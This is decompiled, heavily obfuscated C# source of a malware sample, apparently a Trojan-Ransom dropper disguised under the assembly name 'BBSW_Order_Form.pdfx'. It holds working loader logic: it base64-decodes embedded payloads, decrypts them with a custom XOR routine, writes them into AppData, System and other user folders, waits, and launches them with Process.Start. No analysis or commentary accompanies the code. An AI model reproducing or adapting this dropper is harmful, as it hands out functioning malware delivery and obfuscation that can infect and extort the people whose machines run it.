// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BBSW_Order_Form.pdfx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 34CD51D5-5D79-41B6-BEDE-66B03349B490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-cd007c9e35c8c6eb762d25c6e17d011415c73438989144d0f952e82b44cca8ba.exe

using \u0003;
using \u0004;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0004
{
  internal sealed class \u0001
  {
    private static string[] \u0001;
    private static string[] \u0002;
    private static string[] \u0003;
    private static string[] \u0004;

    static \u0001()
    {
      string[] strArray1 = new string[2];
      if (true)
        goto label_9;
label_1:
      string[] strArray2;
      strArray2[0] = \u0001.\u0001(2);
      strArray2[1] = \u0001.\u0001(2);
      \u0001.\u0001 = strArray2;
      string[] strArray3 = new string[2];
      if (true)
        goto label_10;
label_2:
      string[] strArray4;
      strArray4[0] = \u0001.\u0001(15);
      string[] strArray5;
      int length;
      do
      {
        strArray4[1] = \u0001.\u0001(15);
        \u0001.\u0002 = strArray4;
        length = 2;
        if (length != 0)
        {
          string[] strArray6 = new string[length];
          if (true)
            goto label_11;
label_5:
          strArray5[0] = \u0001.\u0001(20);
          strArray5[1] = \u0001.\u0001(41);
          continue;
label_11:
          strArray5 = strArray6;
          goto label_5;
        }
        else
          goto label_7;
      }
      while (false);
      \u0001.\u0003 = strArray5;
      length = 2;
label_7:
      string[] strArray7 = new string[length];
      if (true)
        goto label_12;
label_8:
      string[] strArray8;
      strArray8[0] = \u0001.\u0001(70);
      strArray8[1] = \u0001.\u0001(71986);
      \u0001.\u0004 = strArray8;
      return;
label_12:
      strArray8 = strArray7;
      goto label_8;
label_10:
      strArray4 = strArray3;
      goto label_2;
label_9:
      strArray2 = strArray1;
      goto label_1;
    }

    [STAThread]
    public static void \u0001()
    {
label_0:
      int num1;
      int num2;
      try
      {
        if (true)
          goto label_38;
label_1:
        if (true)
          num2 = 1;
label_2:
        if (true)
          goto label_40;
label_3:
        int upperBound1 = \u0001.\u0001.GetUpperBound(0);
        if (true)
          goto label_41;
label_4:
        int index1;
        if (true)
        {
          index1 = 0;
          goto label_20;
        }
        else
          goto label_20;
label_41:
        int num3 = upperBound1;
        goto label_4;
label_40:
        int num4 = 2;
        goto label_3;
label_5:
        if (true)
          goto label_43;
label_6:
        string Left = \u0001.\u0001[index1];
        goto label_7;
label_43:
        num4 = 3;
        goto label_6;
label_7:
        num4 = 6;
        if (Operators.CompareString(Left, \u0001.\u0001(2), false) != 0)
          goto label_9;
label_8:
        num4 = 7;
        \u0001.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        goto label_19;
label_9:
        num4 = 9;
        int num5 = Operators.CompareString(Left, \u0001.\u0001(222958), false);
        if (true)
        {
          if (num5 != 0)
            goto label_12;
        }
        else
          goto label_36;
label_11:
        num4 = 10;
        \u0001.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
        goto label_19;
label_12:
        num4 = 12;
        if (Operators.CompareString(Left, \u0001.\u0001(222971), false) != 0)
          goto label_14;
label_13:
        num4 = 13;
        \u0001.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        goto label_19;
label_14:
        num4 = 15;
        if (true)
        {
          if (Operators.CompareString(Left, \u0001.\u0001(222988), false) != 0)
            goto label_18;
        }
        else
          goto label_23;
label_16:
        if (true)
        {
          num4 = 16;
          \u0001.\u0001[index1] = Environment.GetFolderPath(Environment.SpecialFolder.System);
          goto label_19;
        }
        else
          goto label_13;
label_18:
        num4 = 19;
        \u0001.\u0001[index1] = \u0001.\u0001[index1];
label_19:
        num4 = 21;
        checked { ++index1; }
label_20:
        int num6 = index1;
label_21:
        int num7 = num3;
        if (num6 <= num7)
          goto label_5;
label_22:
        num4 = 22;
label_23:
        int upperBound2 = \u0001.\u0004.GetUpperBound(0);
        int index2 = 0;
        goto label_33;
label_24:
        num4 = 23;
        byte[] bytes = \u0001.\u0001(Convert.FromBase64String(\u0001.\u0004[index2]), \u0001.\u0001(222997));
label_25:
        num4 = 24;
        string str = \u0001.\u0001[index2] + \u0001.\u0001(223010) + \u0001.\u0003[index2];
label_26:
        int num8 = 25;
        if (num8 == 0)
        {
          num6 = num8;
          goto label_21;
        }
        else
        {
          num4 = num8;
          File.WriteAllBytes(str, bytes);
        }
label_28:
        num4 = 26;
        double num9 = Conversions.ToDouble(\u0001.\u0002[index2]) * 1000.0;
        if (true)
          num9 = Math.Round(num9 * 60.0);
        \u0001.\u0001(checked ((int) num9));
label_31:
        num4 = 27;
        Process.Start(str);
label_32:
        num4 = 28;
        checked { ++index2; }
label_33:
        if (index2 <= upperBound2)
          goto label_24;
        else
          goto label_47;
label_36:
        num1 = num5;
        switch (num2)
        {
          case 1:
            int num10 = num1 + 1;
            num1 = 0;
            switch (num10)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_2;
              case 3:
                goto label_5;
              case 4:
              case 8:
              case 11:
              case 14:
              case 17:
              case 20:
              case 21:
                goto label_19;
              case 5:
              case 6:
                goto label_7;
              case 7:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_16;
              case 18:
              case 19:
                goto label_18;
              case 22:
                goto label_22;
              case 23:
                goto label_24;
              case 24:
                goto label_25;
              case 25:
                goto label_26;
              case 26:
                goto label_28;
              case 27:
                goto label_31;
              case 28:
                goto label_32;
              case 29:
                goto label_47;
              default:
                goto label_46;
            }
          default:
            goto label_46;
        }
label_38:
        ProjectData.ClearProjectError();
        goto label_1;
label_35:
        num5 = num4;
        goto label_36;
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_35;
      }
label_46:
      throw ProjectData.CreateProjectError(-2146828237);
label_47:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static void \u0001([In] int obj0)
    {
      if (false)
        return;
      Stopwatch stopwatch1 = new Stopwatch();
      if (true)
        goto label_9;
label_2:
      Stopwatch stopwatch2;
      do
      {
        Stopwatch stopwatch3 = stopwatch2;
        if (true)
          goto label_10;
label_5:
        while (stopwatch2.ElapsedMilliseconds < (long) obj0)
        {
          if (true)
            Application.DoEvents();
        }
        continue;
label_10:
        stopwatch3.Start();
        goto label_5;
      }
      while (false);
      Stopwatch stopwatch4 = stopwatch2;
      if (false)
        return;
      stopwatch4.Stop();
      return;
label_9:
      stopwatch2 = stopwatch1;
      goto label_2;
    }

    public static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      byte[] bytes = Encoding.Default.GetBytes(obj1);
      if (true)
        goto label_19;
label_1:
      int num1 = (int) obj0[checked (obj0.Length - 1)] ^ 112;
      if (true)
        goto label_20;
label_2:
      int num2 = obj0.Length;
      if (true)
        num2 = num2;
      else
        goto label_8;
label_4:
      byte[] numArray1 = new byte[checked (num2 + 1)];
      if (true)
        goto label_21;
label_5:
      int num3 = 0;
      int num4 = obj0.Length;
      goto label_6;
label_21:
      byte[] arySrc = numArray1;
      goto label_5;
label_6:
      int num5 = checked (num4 - 1);
      int num6;
      if (false)
      {
        num2 = num3;
      }
      else
      {
        num6 = num5;
        num2 = num3;
      }
label_8:
      int num7;
      byte[] numArray2;
      if (true)
      {
        if (true)
          goto label_23;
label_17:
        int index1;
        while (index1 <= num6)
        {
          int index2;
          arySrc[index1] = checked ((byte) ((int) obj0[index1] ^ num7 ^ (int) numArray2[index2]));
          int num8 = index2;
          if (true)
          {
            int num9 = checked (obj1.Length - 1);
            if (num8 == num9)
            {
              if (true)
              {
                index2 = 0;
                goto label_16;
              }
              else
                goto label_16;
            }
            else
              num8 = index2;
          }
          int num10 = 1;
          if (num10 == 0)
          {
            num4 = num10;
            num3 = num8;
            goto label_6;
          }
          else
            index2 = checked (num8 + num10);
label_16:
          checked { ++index1; }
        }
        return (byte[]) Utils.CopyArray((Array) arySrc, (Array) new byte[checked (obj0.Length - 2 + 1)]);
label_23:
        index1 = num2;
        goto label_17;
      }
      else
        goto label_4;
label_20:
      num7 = num1;
      goto label_2;
label_19:
      numArray2 = bytes;
      goto label_1;
    }
  }
}
